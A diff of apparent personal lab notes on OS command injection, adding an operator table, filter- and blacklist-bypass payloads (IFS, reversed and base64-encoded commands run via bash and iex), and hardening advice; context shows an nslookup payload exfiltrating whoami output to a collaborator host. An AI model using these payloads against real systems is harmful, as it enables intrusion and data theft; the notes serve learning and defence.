@@ -16,7 +16,7 @@ The basic example from PortSwigger is:
 
 	Here we've got an application that performs a stock lookup using a shell script on the underlying server. There are no user input protections in place. 
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072123.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072123.png)
 	
 	The request looks like this:
 	
@@ -54,11 +54,11 @@ The basic example from PortSwigger is:
 	
 	Testing each parameter individually, we get an error in the productId field:
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072647.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072647.png)
 	
 	The same payload works in the storeId field, however. 
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072745.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801072745.png)
 	
 	The following script is what's getting executed
 	
@@ -161,11 +161,11 @@ This will generate a 10 second time delay.
 
 	The application has a user feedback submission form.
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801075848.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801075848.png)
 	
 	After submitting feedback we just get a simple confirmation message
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801075935.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801075935.png)
 	
 	The submission POST request and response are below:
 	
@@ -235,11 +235,11 @@ This will generate a 10 second time delay.
 	"Could not save"
 	```
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801080537.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801080537.png)
 	
 	And the lab is done. 
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801080637.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801080637.png)
 	
 
 #### Redirecting output
@@ -359,7 +359,7 @@ The example given on PortSwigger is
 	
 	Done!
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801085732.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801085732.png)
 
 
 #### Out-of-band techniques
@@ -447,7 +447,7 @@ In some cases, we might be able to trigger a network (DNS) lookup and/or outboun
 	{}
 	```
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801092618.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801092618.png)
 	
 	And that solves the lab
 
@@ -500,15 +500,15 @@ It may be possible to extract data with out-of-band interaction. An example is b
 	&nslookup `whoami`.r0shockfscjy0ox7a88vh66w9nfe35ru.oastify.com&
 	```
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801093406.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093406.png)
 	
 	After sending this request, we get a connection to collaborator showing the username as a subdomain:
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801093716.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093716.png)
 	
 	After submitting that value to the lab we get the completion banner.
 	
-	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801093834.png)
+	![](../../../../assets/screenshots/command-injection/Pasted%20image%2020250801093834.png)
 	
 
 
@@ -523,6 +523,17 @@ Some shell characters function as command separators, including:
 ||
 ```
 
+### Injection operators
+
+| **Operator** | **Character** | **URL-encoded character** |       **Executed Command**        |
+| :----------: | :-----------: | :-----------------------: | :-------------------------------: |
+|  Semicolon   |      `;`      |           `%3b`           |               Both                |
+|   New Line   |     `\n`      |           `%0a`           |               Both                |
+|  Background  |      `&`      |           `%26`           | Both (Second likely shown first)  |
+|     Pipe     |      \|       |           `%7c`           |    Both (Only second is shown)    |
+|     AND      |     `&&`      |         `%26%26`          | Both (only if the first succeeds) |
+|      OR      |     \|\|      |         `%7c%7c`          | Second only (only if first fails) |
+
 The following work on \*nix only
 
 ```
@@ -533,6 +544,180 @@ The following work on \*nix only
 
 On Unix-based systems we can also use `$()` and backticks '\`\`' to execute inline commands.
 
+### Filtered character bypass
+
+=== "Linux" 
+
+	Get all environment variables
+	
+	```bash
+	printenv
+	```
+	
+	**Spaces are filtered**
+	Use tabs instead of spaces
+	
+	```
+	%09
+	```
+	
+	Replace this for spaces/tabs
+	
+	```
+	${IFS}
+	```
+	
+	Bracket expansion - the comma will be replaced with a space
+	
+	```
+	{ls,-la}
+	```
+	
+	**Other characters are filtered**
+	This will be replaced with '/'
+	
+	```
+	${PATH:0:1}
+	```
+	
+	Will be replaced with ';'
+	
+	```
+	${LS_COLORS:10:1}
+	```
+	
+	Shift characters by one
+	
+	```
+	$(tr '!-}' '"-~'<<<[)
+	```
+
+=== "Windows"
+
+	Get all environment variables
+	
+	```powershell
+	Get-ChildItem Env:
+	```
+	
+	**Spaces are filtered**
+	
+	Use tabs instead of spaces
+	
+	```
+	%09
+	```
+	
+	Will be replaced by a space
+	
+	```
+	# cmd
+	%PROGRAMFILES:~10,-5%
+	
+	# powershell
+	$env:PROGRAMFILES[10]
+	```
+	
+	**Other characters are filtered**
+	
+	Will be replaced with '\\'
+	
+	```
+	# cmd
+	%HOMEPATH:~0,-17%
+	
+	# powershell
+	$env:HOMEPATH[0]
+	```
+
+### Blacklisted command bypass
+
+=== "Linux"
+
+	**Character insertion**
+	
+	Total of `'` and/or `"` must be even
+	
+	```
+	' or "
+	```
+	
+	Linux only
+	
+	```
+	$@ or \
+	```
+	
+	**Case Manipulation**
+	
+	```
+	$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+	```
+	
+	Execute reversed commands
+	
+	```
+	$(rev<<<'imaohw')
+	```
+	
+	**Encoded Commands**
+	
+	Encode a string with base64
+	
+	```
+	echo -n 'cat /etc/passwd | grep 33' | base64
+	```
+	
+	Execute reversed command
+	
+	```
+	bash<<<$(base64 -d<<
+	```
+
+=== "Windows"
+
+	**Character insertion**
+	
+	Windows only
+	
+	```
+	^
+	```
+	
+	**Case Manipulation**
+	
+	Just send weird casing
+	
+	```
+	WhoAmi
+	```
+	
+	**Reversed Commands**
+	
+	```powershell
+	"whoami"[-1..-20] -join ''
+	```
+	
+	Execute reversed commands
+	
+	```powershell
+	iex "$('imaohw'[-1..-20] -join '')"
+	```
+	
+	**Encoded Commands**
+	
+	Base64 encode a command
+	
+	```powershell
+	[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+	```
+	
+	Execute the encoded command
+	
+	```powershell
+	iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+	```
+
 ## Preventing OS Command Injection
 
 Several measures can be taken to mitigate the risk of OS Command Injection, including:
@@ -542,6 +727,17 @@ Several measures can be taken to mitigate the risk of OS Command Injection, incl
 	- Use whitelists
 	- Validate input on the server side, not just on the client side.
 	- Don't rely on simply escaping shell metacharacters.
+- Use the web server's built-in Web Application Firewall (e.g., in Apache `mod_security`), in addition to an external WAF (e.g. `Cloudflare`, `Fortinet`, `Imperva`..)
+    
+- Abide by the [Principle of Least Privilege (PoLP)](https://en.wikipedia.org/wiki/Principle_of_least_privilege) by running the web server as a low privileged user (e.g. `www-data`)
+    
+- Prevent certain functions from being executed by the web server (e.g., in PHP `disable_functions=system,...`)
+    
+- Limit the scope accessible by the web application to its folder (e.g. in PHP `open_basedir = '/var/www/html'`)
+    
+- Reject double-encoded requests and non-ASCII characters in URLs
+    
+- Avoid the use of sensitive/outdated libraries and modules (e.g. [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php))
 
 
 
